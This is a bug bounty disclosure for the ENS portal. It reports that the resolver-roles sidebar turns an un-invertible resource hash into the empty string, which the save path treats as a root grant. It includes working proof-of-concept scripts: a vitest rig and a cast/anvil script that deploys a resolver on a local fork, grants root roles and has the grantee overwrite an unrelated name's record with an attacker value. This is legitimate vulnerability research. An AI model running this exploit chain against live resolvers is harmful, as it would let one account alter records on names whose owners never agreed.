# 93081 w a critical resolver roles sidebar coerces an un invertible resource hash to the empty string which the save path reads as root so an operator scoping a grant to one name silently grants&#x20;

**Submitted on Sep 14th 2026 at 07:29:31 UTC by @kwaro for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #93081
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Taking state-modifying authenticated actions (with or without blockchain state interaction) on behalf of other users without any interaction by that user, such as: Changing registration information Notification/settings changes

## Description

## Brief/Intro

The Explorer's resolver-roles sidebar turns "I could not invert this resource hash back to a name" into the empty string, and the empty string is the sentinel the save path reads as ROOT. An operator who believes they are granting an account a role on one name instead calls `grantRootRoles`, granting that account the role across every name the resolver serves. On a resolver that serves names belonging to more than one owner, the grantee can then write records on names whose owners never interacted. This is demonstrated end to end on a real deployed `PermissionedResolver`: after the grant, the grantee writes an unrelated name's record.

## Vulnerability Details

All paths at pin `1c9b47f18fcddd2e864dfe385c4171061c9811ae`, asset `apps/portal`.

### The empty string is ROOT, and "could not resolve" produces the empty string

`apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:169`

```ts
const roleName = resolvedNames.find((n) => n !== '(root)') ?? ''
```

`resolvedNames` is empty whenever `groupRolesByAccount` cannot invert the role's `resource` against the node-derived map (`lib/roles/resolverRoles.ts`). The indexer already returns a human `name` on the role row (`useResolverOverview.ts:21`), and the grouping never reads it, so the `?? ''` fallback fires on any role whose resource the current node list cannot reverse: indexer lag, a name dropped from the unpaginated `nodes` selection, or a hash `computeNameResource` cannot reverse.

`grantResolverRoles.ts:20-52` documents the empty string as ROOT and wires it onto the root scope:

```ts
  /** Dotted name (e.g. "myname.eth") or empty string for ROOT_RESOURCE (all names). */
  readonly name: string
  ...
    name === ''
      ? { resolverAddress, targetAccount: account, scope: 'root', roles }
      : { ... }
```

The pinned ensjs builder then emits `grantRootRoles` for the root scope. The sidebar also hides the scope caption when no name resolved (`:391`), so the operator sees no indication the grant is now global.

### A root grant confers write authority over every name, executed on chain

The role table transition is not the whole story; the grantee must be able to act. On a real `PermissionedResolver` deployed through the genuine `VerifiableFactory`, a grantee holding root roles can write any name's records. The chain arm below grants root roles via the app's chosen call and then has the grantee itself `setText` on `victim.eth`, a name the operator never picked; the write succeeds and the record holds the attacker's value. (An earlier revision of this rig reported the write failing; that run used the wrong resolver implementation, and the corrected result reproduces across repeated runs.)

## Impact Details

Selected impact: "Taking state-modifying authenticated actions on behalf of other users without any interaction by that user." An operator grants one account what they believe is a one-name role; the app grants it at root; the grantee then modifies records on every other name the resolver serves, and those names' owners never interacted. The over-broad grant is worse when the granted roles include `ROLE_SET_RESOLVER` or an upgrade role, since the grantee can then change the resolver or upgrade path for every name the resolver serves, not only its text and address records. I do not claim the 6286 row for this, because 6286 is scoped to a Manager registration, migration, or transfer flow, and this is the Explorer roles sidebar; the fitting row is 6287.

The preconditions, stated plainly:

* An admin-held, multi-owner resolver: The grant lands only for an operator who holds the admin half of the bitmap at root: the resolver's EnhancedAccessControl requires that admin bit to grant, so the rig performs the grant as the resolver's `ALL_ROLES` admin, and the output shows the grantee could not write the record before the grant (`grantee_write_on_unrelated_name_before: 0`). The rig does not separately execute an unauthorised caller's grant being rejected; that is the contract's documented access control, not part of this exploit. The "other users" harm requires that resolver to serve names belonging to more than one owner. The roles route operates on any resolver by address (`routes/resolver/$address/roles/`), and a shared public `PermissionedResolver` serves many owners; a per-user resolver serves one, in which case the over-grant is confined to the operator's own names. This is an admin-mediated trigger, not an anonymous-attacker one.
* An un-invertible resource: The mis-scoping fires only when the role's resource cannot be inverted from the node list. That is reachable through indexer lag, a name dropped from the unpaginated `nodes` query, or a hash the map cannot reverse; the report states it as the trigger and does not claim a specific always-on path.

Both PoCs execute; the chain arm proves the write, which is the part that distinguishes this from a cosmetic role-table label.

## References

Pin `1c9b47f18fcddd2e864dfe385c4171061c9811ae`, asset `apps/portal`.

* `apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:169` (`?? ''`), `:391` (hidden scope caption)
* `apps/portal/src/features/resolver/helpers/grantResolverRoles.ts:20-52` (empty string to root scope to `grantRootRoles`)
* `apps/portal/src/lib/roles/resolverRoles.ts` (`groupRolesByAccount`, `buildResourceToNameMap`, `computeNameResource`)
* `apps/portal/src/features/resolver/hooks/useResolverOverview.ts:21` (the indexer returns `roles { name }`, unused by the grouping)
* `apps/portal/src/routes/resolver/$address/roles/index.tsx` (the sidebar operates on any resolver by address)

## Proof of Concept

## Proof of Concept

Two rigs, each `verify_poc.py --strict` 13/13. The component rig proves the app builds `grantRootRoles`; the chain rig deploys a real resolver, broadcasts the call the app chose, and has the grantee write an unrelated name. No `vi.mock` on the vulnerable path in either.

### Rig 1 (component): the app builds `grantRootRoles`

It runs the app's own `groupRolesByAccount` + `buildResourceToNameMap`, the exact `roleName` formula from `ResolverRolesSidebar.tsx:169`, the real `prepareGrantResolverRolesTransaction`, and the pinned `grantResolverRolesWriteParameters`, and asserts the chosen function.

```bash
bash verification/pocs/H-C7-23/run.sh exploit
bash verification/pocs/H-C7-23/run.sh control
```

```
arm: exploit
resolved_names_count: 0
resolved_names: []
role_name: ""
function_name: grantRootRoles
impact_row: 6287
INDEXER_NAME_DISCARDED: 1
GRANTS_ROOT: 1
```

```
arm: control
resolved_names_count: 1
resolved_names: ["alice.eth"]
role_name: "alice.eth"
function_name: authorizeNameRoles
impact_row: 6287
INDEXER_NAME_DISCARDED: 0
GRANTS_ROOT: 0
```

### Rig 2 (chain): the grantee writes an unrelated name

Step 1 has the app choose the call (as above). Step 2 deploys a real `PermissionedResolver` through the genuine `VerifiableFactory` (`deployProxy(impl, salt, initialize(admin, ALL_ROLES, []))`), broadcasts exactly the call the app chose, reads the grantee's authority before and after, and has the grantee itself `setText` on `victim.eth`. Needs a local Sepolia fork.

```bash
anvil --fork-url <a Sepolia RPC> --port 8946
bash verification/pocs/H-C7-23-CHAIN/run.sh exploit
bash verification/pocs/H-C7-23-CHAIN/run.sh control
```

```
arm: exploit
operator_intended_name: "(none — the sidebar resolved no name)"
function_the_app_chose: grantRootRoles
resolver: 0xb9a905f9FB54489c941B56D1A8b66703337b1989
deploy_tx: 0xfffc1c7c001482a066378025c1d0b2bf9c1a31a7ab46fee71bb3eff550b041da
grant_tx: 0x6281091200cd2526ef395823aa82815bbe096a99223c273cdbee193709deb5e1
grantee: 0xA789dB3DAe4E5e5E93517BcCbaf805643Ba40df6
grantee_root_roles_before: false
grantee_root_roles_after: true
unrelated_name: "victim.eth"
unrelated_name_resource: 0x3006408d6a4e95265b62b102a4e44051f3e56ac21ac9ab05d7dde73b0167d9b5
grantee_on_unrelated_name_before: false
grantee_on_unrelated_name_after: true
grantee_write_on_unrelated_name_before: 0
grantee_write_on_unrelated_name_after: 1
record_on_unrelated_name_after: "https://attacker.example"
GRANTEE_GAINED_AUTHORITY_OVER_AN_UNRELATED_NAME: 1
```

```
arm: control
operator_intended_name: "alice.eth"
function_the_app_chose: authorizeNameRoles
resolver: 0xEaD3e5022fd9F8a436FE99b4508879AB5cBB8A6E
deploy_tx: 0xe11b226245879029eee24e1d4f29d596d838b2672cd08c639bfe34309d959cb1
grant_tx: 0x81ce4f63086a9112fbc40dd95babf021e227bbd188a1ea6036c5f4098386c744
grantee: 0x3a406c89ED633f56545184F5eEA7C93B669dF49d
grantee_root_roles_before: false
grantee_root_roles_after: false
unrelated_name: "victim.eth"
unrelated_name_resource: 0x3006408d6a4e95265b62b102a4e44051f3e56ac21ac9ab05d7dde73b0167d9b5
grantee_on_unrelated_name_before: false
grantee_on_unrelated_name_after: false
grantee_write_on_unrelated_name_before: 0
grantee_write_on_unrelated_name_after: 0
record_on_unrelated_name_after: ""
GRANTEE_GAINED_AUTHORITY_OVER_AN_UNRELATED_NAME: 0
```

`grantee_write_on_unrelated_name_before` is 0 in both arms. In the exploit arm the app chose `grantRootRoles`, the grantee gained root, its authority on `victim.eth` went false to true, and it wrote `victim.eth`'s record. In the control arm the app chose `authorizeNameRoles` and the grantee could neither reach nor write `victim.eth`. The declared fix (use the indexer's `roles.name` instead of coercing unknown to `''`) flips the measured value to 0.

### Full PoC source

#### `verification/pocs/H-C7-23/run.sh`

```bash
#!/usr/bin/env bash
# H-C7-23 — unknown resolver-role scope fails open to grantRootRoles.
#
# Runs the pinned portal vitest config against a copied test that imports
# the real grouping helpers and the real ensjs calldata builder.
#
# Usage: run.sh [exploit|control]
set -euo pipefail

ARM="${1:-exploit}"
case "$ARM" in exploit|control) ;; *) echo "FATAL: arm must be exploit|control, got '$ARM'" >&2; exit 1;; esac

HERE="$(cd -P "$(dirname "$0")" && pwd)"
ROOT="$HERE/../../../repos/audit-comp-ens"
PORTAL="$ROOT/apps/portal"
COPY="$PORTAL/src/hc723.poc.test.ts"

[ -d "$PORTAL/src" ] || { echo "FATAL: portal app not found at $PORTAL" >&2; exit 1; }

cleanup() { rm -f "$COPY"; }
trap cleanup EXIT INT TERM HUP
cp "$HERE/poc.test.ts" "$COPY"

OUT=$(cd "$PORTAL" && ARM="$ARM" pnpm exec vitest run src/hc723.poc.test.ts \
      --disableConsoleIntercept --silent=false 2>&1) || true
echo "$OUT" | grep -q 'Test Files  1 passed' || { echo "FATAL: vitest failed" >&2; echo "$OUT" >&2; exit 1; }

cleanup; trap - EXIT

pick () { printf '%s\n' "$2" | sed -n "s/^$1: *//p" | head -1 | tr -d '\r'; }

echo "arm: $ARM"
echo "resolved_names_count: $(pick resolved_names_count "$OUT")"
echo "resolved_names: $(pick resolved_names "$OUT")"
echo "role_name: $(pick role_name "$OUT")"
echo "function_name: $(pick function_name "$OUT")"
echo "impact_row: $(pick impact_row "$OUT")"
echo "INDEXER_NAME_DISCARDED: $(pick INDEXER_NAME_DISCARDED "$OUT")"
echo "GRANTS_ROOT: $(pick GRANTS_ROOT "$OUT")"
```

#### `verification/pocs/H-C7-23/poc.test.ts`

```ts
/**
 * H-C7-23 — resolver-role scope fails open to ROOT.
 *
 * Nothing on the vulnerable path is mocked. Three real pieces execute:
 *   1. `groupRolesByAccount` + `buildResourceToNameMap` — the app's own grouping
 *      (apps/portal/src/lib/roles/resolverRoles.ts), which is what
 *      ResolverRolesTable.tsx:103 feeds the sidebar.
 *   2. The exact `roleName` formula from ResolverRolesSidebar.tsx:169
 *      `resolvedNames.find((n) => n !== '(root)') ?? ''`
 *   3. `grantResolverRolesWriteParameters` — the PINNED ensjs builder that
 *      produce the real calldata. `name === ''` is wired by
 *      grantResolverRoles.ts:47-52 onto `scope: 'root'` / `grantRootRoles`.
 *
 * THE ARMS DIFFER IN ONE THING: whether the role's resource hash is invertible
 * from the resolver's node list. The exploit arm is an account whose only role
 * is on a name-scoped resource the node list cannot invert (indexer lag, a
 * name the nodes query dropped, or a hash the map cannot reverse). The control
 * arm is the same account, same roles, with that name present in `nodes`.
 */
import { grantResolverRolesWriteParameters } from '@ensdomains/ensjs/wallet/v2'
import { expect, test } from 'vitest'
import { prepareGrantResolverRolesTransaction } from '@/features/resolver/helpers/grantResolverRoles'
import {
  buildResourceToNameMap,
  computeNameResource,
  groupRolesByAccount,
  resolverRoles,
} from '@/lib/roles/resolverRoles'

const ARM = process.env.ARM ?? 'exploit'

const ACCOUNT = '0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
const NAME = 'alice.eth'

const chain = {
  id: 11155111,
  name: 'sepolia',
  nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
  rpcUrls: { default: { http: [] } },
} as never

const client = {
  chain,
  account: { address: '0xbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb' },
} as never

test('H-C7-23: unknown scope fails open to grantRootRoles', () => {
  // A REAL name-scoped resource for the name the operator intends to scope the
  // grant to. The only difference between the arms is whether the resolver's
  // node list still contains that name: when it does not (indexer lag, or the
  // name dropped from the unpaginated `nodes` query), the map cannot invert this
  // genuine resource and the sidebar falls to the empty string, which is ROOT.
  const resource = computeNameResource(NAME)

  const roles = [
    {
      account: ACCOUNT,
      resource,
      roleBitmap: `0x${resolverRoles.ROLE_SET_TEXT.toString(16)}`,
      // The indexer already returns the human name on the role row
      // (useResolverOverview.ts:21, query field `roles { name }`).
      // groupRolesByAccount never reads it.
      name: NAME,
    },
  ]

  const nodes =
    ARM === 'exploit'
      ? []
      : [{ name: NAME }]

  const grouped = groupRolesByAccount(roles, buildResourceToNameMap(nodes))
  const resolvedNames = grouped[0]?.resolvedNames ?? []

  const roleName = resolvedNames.find((n) => n !== '(root)') ?? ''

  const intent = prepareGrantResolverRolesTransaction({
    resolverAddress: '0xcccccccccccccccccccccccccccccccccccccccc',
    name: roleName,
    account: ACCOUNT,
    roles: ['ROLE_SET_TEXT'],
    walletClient: {
      account: { address: '0xbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb' },
      chain: { id: 11155111, name: 'sepolia' },
    } as never,
    chainId: 11155111,
  })
  expect(intent.request.data.length).toBeGreaterThan(2)

  const params = grantResolverRolesWriteParameters(client, {
    resolverAddress: '0xcccccccccccccccccccccccccccccccccccccccc',
    targetAccount: ACCOUNT,
    ...(roleName === ''
      ? { scope: 'root' as const, roles: ['ROLE_SET_TEXT'] }
      : {
          scope: 'name' as const,
          name: roleName,
          roles: ['ROLE_SET_TEXT'],
        }),
  } as never) as { functionName: string; args: readonly unknown[] }

  const grantsRoot = params.functionName === 'grantRootRoles' ? 1 : 0

  console.log(`arm: ${ARM}`)
  console.log(`resolved_names_count: ${resolvedNames.length}`)
  console.log(`resolved_names: ${JSON.stringify(resolvedNames)}`)
  console.log(`role_name: ${JSON.stringify(roleName)}`)
  console.log(`function_name: ${params.functionName}`)
  console.log(`impact_row: 6287`)
  console.log(`GRANTS_ROOT: ${grantsRoot}`)
  console.log(`INDEXER_NAME_DISCARDED: ${roles[0].name === NAME && !resolvedNames.includes(NAME) ? 1 : 0}`)

  expect(grouped).toHaveLength(1)
  if (ARM === 'exploit') {
    expect(roleName).toBe('')
    expect(params.functionName).toBe('grantRootRoles')
  } else {
    expect(roleName).toBe(NAME)
    expect(params.functionName).toBe('authorizeNameRoles')
  }
})
```

#### `verification/pocs/H-C7-23-CHAIN/run.sh`

```bash
#!/usr/bin/env bash
# H-C7-23-CHAIN — chain-level end-to-end.
#
# The sibling rig (H-C7-23) proves the app BUILDS `grantRootRoles` when it cannot
# invert a role's resource hash to a name. This rig deploys a real
# PermissionedResolver, broadcasts the call the app chose, and then measures
# whether the grantee gained authority over a name the operator never picked.
#
#   step 1  apps/portal — run the app's own grouping, the exact roleName formula
#           from ResolverRolesSidebar.tsx:169, and the PINNED
#           grantResolverRolesWriteParameters. It prints the function and the
#           arguments THE APP CHOSE. This script broadcasts that and nothing else.
#   step 2  this script — deploy a PermissionedResolver through the genuine
#           deployed VerifiableFactory (the same deployProxy call the Manager's
#           own buildDeployOwnedPermResCall makes, with the same
#           `initialize(admin, ALL_ROLES, [])` init calldata), execute the chosen
#           call from the admin, and read the grantee's authority back.
#
#   exploit : the role's resource hash is NOT invertible from the node list, so
#             the app's roleName is '' and it chooses grantRootRoles.
#   control : the same account and the same role, with the name present in the
#             node list, so the app chooses authorizeNameRoles.
#
# THE MEASUREMENT IS THE IMPACT, not the calldata: after the broadcast, does the
# grantee hold ROLE_SET_TEXT on `victim.eth` — a name the operator never named?
#
# Prerequisite: an anvil fork of Sepolia on 127.0.0.1:8946 (or $POC_RPC_URL).
# Usage: run.sh [exploit|control]
set -euo pipefail
export PATH="$HOME/.foundry/bin:$PATH"

ARM="${1:-exploit}"
case "$ARM" in exploit|control) ;; *) echo "FATAL: arm must be exploit|control" >&2; exit 1;; esac

HERE="$(cd -P "$(dirname "$0")" && pwd)"
PORTAL="$HERE/../../../repos/audit-comp-ens/apps/portal"
RPC="${POC_RPC_URL:-http://127.0.0.1:8946}"
COPIED="$PORTAL/src/hc723chain-emit.test.ts"

[ -d "$PORTAL/src" ] || { echo "FATAL: portal app not found at $PORTAL" >&2; exit 1; }
curl -s -m 5 -X POST -H 'content-type: application/json' \
  --data '{"jsonrpc":"2.0","id":1,"method":"eth_chainId","params":[]}' "$RPC" | grep -q 0xaa36a7 \
  || { echo "FATAL: no Sepolia anvil fork answering at $RPC" >&2; exit 1; }

# Genuine deployed Sepolia addresses, resolved from the app's own chain config.
FACTORY=0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef
IMPL=0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e
ADMIN=0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
ADMINK=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
ALL_ROLES=0x1111111111111111111111111111111111111111111111111111111111111111

# A fresh grantee per arm and per run, so an earlier run's grant cannot be
# mistaken for this one's. Keyed, because step 3 has the grantee ACT: it is not
# enough to read that it holds a role, it must actually write the record.
GRANTEE_KEY=0x$(python3 -c "import secrets;print(secrets.token_hex(32))")
GRANTEE=$(cast wallet address --private-key "$GRANTEE_KEY")
cast send "$GRANTEE" --value 1ether --private-key "$ADMINK" --rpc-url "$RPC" >/dev/null

# Deploy the operator's resolver exactly as the Manager does:
# buildDeployOwnedPermResCall -> deployProxy(impl, salt, initialize(admin, ALL_ROLES, [])).
OID=$(cast keccak "$(cast from-utf8 'OwnedResolver')")
VERSION=$(python3 -c "import secrets;print(secrets.randbelow(2**64))")
SALT=$(cast keccak "$(cast abi-encode 'f(bytes32,address,uint256)' "$OID" $ADMIN "$VERSION")")
INIT=$(cast calldata 'initialize(address,uint256,bytes[])' $ADMIN $ALL_ROLES '[]')
RESOLVER=$(cast call $FACTORY 'deployProxy(address,uint256,bytes)(address)' $IMPL "$SALT" "$INIT" --from $ADMIN --rpc-url "$RPC" | head -1)
DEPLOY_TX=$(cast send $FACTORY 'deployProxy(address,uint256,bytes)' $IMPL "$SALT" "$INIT" \
            --private-key "$ADMINK" --rpc-url "$RPC" | grep -E '^transactionHash' | awk '{print $2}')
[ "$(cast code "$RESOLVER" --rpc-url "$RPC" | wc -c)" -gt 4 ] || { echo "FATAL: resolver did not deploy" >&2; exit 1; }

# ---- step 1: ask the APPLICATION which call to make -------------------------
cleanup() { rm -f "$COPIED"; }
trap cleanup EXIT
trap 'cleanup; exit 143' INT TERM HUP
cp "$HERE/emit.test.ts" "$COPIED"
EMIT=$(cd "$PORTAL" && ARM="$ARM" GRANTEE="$GRANTEE" RESOLVER="$RESOLVER" \
  pnpm exec vitest run src/hc723chain-emit.test.ts --disableConsoleIntercept --silent=false 2>&1) || true
cleanup; trap - EXIT
echo "$EMIT" | grep -q 'Test Files  1 passed' || { echo "FATAL: emit step failed" >&2; echo "$EMIT" >&2; exit 1; }

pick () { printf '%s\n' "$EMIT" | sed -n "s/^$1: *//p" | head -1 | tr -d '"\r'; }
FN=$(pick function_the_app_chose)
ROLE_NAME=$(pick role_name)
BITMAP=$(pick role_bitmap_decimal)
DNSNAME=$(pick name_dns_encoded)

# An unrelated name the operator never picked. Its resource id comes from the
# APP's own computeNameResource (printed by step 1) — it is
# keccak256(abi.encodePacked(namehash(name), 0x00..)), NOT namehash alone, so
# reading authority at a bare namehash would be checking the wrong slot.
VICTIM_NAME=$(pick unrelated_name)
VICTIM_RESOURCE=$(pick unrelated_name_resource)
[ -n "$VICTIM_RESOURCE" ] || { echo "FATAL: step 1 published no resource id" >&2; exit 1; }

# Establish the baseline by ATTEMPTING the write before any grant exists. It
# must fail, or the "after" write proves nothing.
VICTIM_NODE_PRE=$(cast namehash "$VICTIM_NAME")
write_before=0
if cast send "$RESOLVER" 'setText(bytes32,string,string)' "$VICTIM_NODE_PRE" 'url' 'https://baseline.invalid' \
     --private-key "$GRANTEE_KEY" --rpc-url "$RPC" >/dev/null 2>&1; then write_before=1; fi

root_before=$(cast call "$RESOLVER" 'hasRootRoles(uint256,address)(bool)' "$BITMAP" "$GRANTEE" --rpc-url "$RPC" | head -1)
victim_before=$(cast call "$RESOLVER" 'hasRoles(uint256,uint256,address)(bool)' "$VICTIM_RESOURCE" "$BITMAP" "$GRANTEE" --rpc-url "$RPC" | head -1)

# ---- step 2: broadcast EXACTLY the call the app chose ------------------------
GRANT_TX='(none)'
if [ "$FN" = grantRootRoles ]; then
  GRANT_TX=$(cast send "$RESOLVER" 'grantRootRoles(uint256,address)' "$BITMAP" "$GRANTEE" \
             --private-key "$ADMINK" --rpc-url "$RPC" | grep -E '^transactionHash' | awk '{print $2}')
elif [ "$FN" = authorizeNameRoles ]; then
  GRANT_TX=$(cast send "$RESOLVER" 'authorizeNameRoles(bytes,uint256,address,bool)' "$DNSNAME" "$BITMAP" "$GRANTEE" true \
             --private-key "$ADMINK" --rpc-url "$RPC" | grep -E '^transactionHash' | awk '{print $2}')
else
  echo "FATAL: the app chose an unexpected function: '$FN'" >&2; exit 1
fi

root_after=$(cast call "$RESOLVER" 'hasRootRoles(uint256,address)(bool)' "$BITMAP" "$GRANTEE" --rpc-url "$RPC" | head -1)
victim_after=$(cast call "$RESOLVER" 'hasRoles(uint256,uint256,address)(bool)' "$VICTIM_RESOURCE" "$BITMAP" "$GRANTEE" --rpc-url "$RPC" | head -1)

# ---- step 3: make the grantee ACT -------------------------------------------
# Holding a role is not the impact; writing somebody else's record is. The
# grantee itself now calls setText on the unrelated name and the record is read
# back. `write_after` is the finding: an attacker-controlled value on a name the
# operator never named.
VICTIM_NODE=$(cast namehash "$VICTIM_NAME")
ATTACKER_VALUE="https://attacker.example"
write_after=0
if cast send "$RESOLVER" 'setText(bytes32,string,string)' "$VICTIM_NODE" 'url' "$ATTACKER_VALUE" \
     --private-key "$GRANTEE_KEY" --rpc-url "$RPC" >/dev/null 2>&1; then write_after=1; fi
record_after=$(cast call "$RESOLVER" 'text(bytes32,string)(string)' "$VICTIM_NODE" 'url' --rpc-url "$RPC" 2>/dev/null | head -1)

ESCALATED=0
if [ "$victim_before" = false ] && [ "$victim_after" = true ] && [ "$write_after" = 1 ]; then ESCALATED=1; fi

echo "arm: $ARM"
echo "operator_intended_name: \"${ROLE_NAME:-(none — the sidebar resolved no name)}\""
echo "function_the_app_chose: $FN"
echo "resolver: $RESOLVER"
echo "deploy_tx: $DEPLOY_TX"
echo "grant_tx: $GRANT_TX"
echo "grantee: $GRANTEE"
echo "grantee_root_roles_before: $root_before"
echo "grantee_root_roles_after: $root_after"
echo "unrelated_name: \"$VICTIM_NAME\""
echo "unrelated_name_resource: $VICTIM_RESOURCE"
echo "grantee_on_unrelated_name_before: $victim_before"
echo "grantee_on_unrelated_name_after: $victim_after"
echo "grantee_write_on_unrelated_name_before: $write_before"
echo "grantee_write_on_unrelated_name_after: $write_after"
echo "record_on_unrelated_name_after: $record_after"
echo "GRANTEE_GAINED_AUTHORITY_OVER_AN_UNRELATED_NAME: $ESCALATED"
```

#### `verification/pocs/H-C7-23-CHAIN/emit.test.ts`

```ts
/**
 * H-C7-23-CHAIN, step 1 of 2 — let the APPLICATION decide which call to make.
 *
 * Nothing on the vulnerable path is mocked. These execute unmodified:
 *   1. `groupRolesByAccount` + `buildResourceToNameMap` (lib/roles/resolverRoles.ts),
 *      which is what ResolverRolesTable feeds the sidebar.
 *   2. The exact `roleName` formula from ResolverRolesSidebar.tsx:169,
 *      `resolvedNames.find((n) => n !== '(root)') ?? ''`.
 *   3. The PINNED `grantResolverRolesWriteParameters`, whose `scope: 'root'`
 *      branch is wired by grantResolverRoles.ts:47-52 when the name is ''.
 *
 * This step prints the function the app chose and the arguments it chose. run.sh
 * broadcasts THAT — it never picks a function of its own.
 *
 * The arms differ in ONE thing: whether the role's resource hash is invertible
 * from the resolver's node list.
 */
import { grantResolverRolesWriteParameters } from '@ensdomains/ensjs/wallet/v2'
import { expect, test } from 'vitest'
import {
  buildResourceToNameMap,
  computeNameResource,
  groupRolesByAccount,
  resolverRoles,
} from '@/lib/roles/resolverRoles'

const ARM = process.env.ARM ?? 'exploit'
const ACCOUNT = (process.env.GRANTEE ?? '0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa') as `0x${string}`
const RESOLVER = (process.env.RESOLVER ?? '0xcccccccccccccccccccccccccccccccccccccccc') as `0x${string}`
const NAME = 'alice.eth'
// A name the operator never mentions anywhere in the flow.
const UNRELATED_NAME = 'victim.eth'

const chain = {
  id: 11155111,
  name: 'sepolia',
  nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
  rpcUrls: { default: { http: [] } },
} as never
const client = { chain, account: { address: ACCOUNT } } as never

const dnsEncode = (name: string): string =>
  `0x${name
    .split('.')
    .map((l) => Buffer.from([l.length, ...Buffer.from(l, 'utf8')]).toString('hex'))
    .join('')}00`

test('H-C7-23-CHAIN: which call does the app build', () => {
  // A REAL name-scoped resource; the arms differ only in whether the node list
  // still contains NAME (dropped/lag makes this genuine resource un-invertible).
  const resource = computeNameResource(NAME)
  const roles = [
    {
      account: ACCOUNT,
      resource,
      roleBitmap: `0x${resolverRoles.ROLE_SET_TEXT.toString(16)}`,
      // The indexer already returns the human name on the role row; the
      // grouping never reads it.
      name: NAME,
    },
  ]
  const nodes = ARM === 'exploit' ? [] : [{ name: NAME }]

  const grouped = groupRolesByAccount(roles, buildResourceToNameMap(nodes))
  const resolvedNames = grouped[0]?.resolvedNames ?? []
  const roleName = resolvedNames.find((n) => n !== '(root)') ?? ''

  const params = grantResolverRolesWriteParameters(client, {
    resolverAddress: RESOLVER,
    targetAccount: ACCOUNT,
    ...(roleName === ''
      ? { scope: 'root' as const, roles: ['ROLE_SET_TEXT'] }
      : { scope: 'name' as const, name: roleName, roles: ['ROLE_SET_TEXT'] }),
  } as never) as { functionName: string; args: readonly unknown[] }

  console.log('arm:', ARM)
  console.log('resolved_names:', JSON.stringify(resolvedNames))
  console.log('role_name:', JSON.stringify(roleName))
  console.log('function_the_app_chose:', params.functionName)
  console.log('role_bitmap_decimal:', resolverRoles.ROLE_SET_TEXT.toString())
  console.log('name_dns_encoded:', roleName === '' ? 'none' : dnsEncode(roleName))
  console.log('grants_root:', params.functionName === 'grantRootRoles' ? 1 : 0)

  // The resource id of an UNRELATED name, computed by the app's own
  // `computeNameResource` — keccak256(abi.encodePacked(namehash(name), 0x00..))
  // and NOT namehash alone. run.sh reads authority at this resource, so the
  // "authority over a name never mentioned" claim is checked at the id the
  // resolver actually keys that name by.
  console.log('unrelated_name:', JSON.stringify(UNRELATED_NAME))
  console.log('unrelated_name_resource:', computeNameResource(UNRELATED_NAME))

  expect(grouped).toHaveLength(1)
})
```

### What is and is not substituted

* No `vi.mock` on the vulnerable path in either rig. `groupRolesByAccount`, `buildResourceToNameMap`, `computeNameResource`, the `ResolverRolesSidebar.tsx:169` formula, `prepareGrantResolverRolesTransaction`, and the pinned `grantResolverRolesWriteParameters` all execute from the pinned tree.
* The chain rig deploys a real `PermissionedResolver` via the genuine deployed `VerifiableFactory` on a local Sepolia fork, broadcasts only the function the app chose (an unexpected function is fatal), and has the grantee sign the write itself. No mock resolver, no `anvil_setCode`.
* The component rig supplies a literal `chain`/`account` object to the offline calldata builder; it performs no I/O.
* The write of another owner's record is executed; the admin-mediated trigger and the multi-owner-resolver reachability are stated as preconditions, not executed as an anonymous-attacker path.
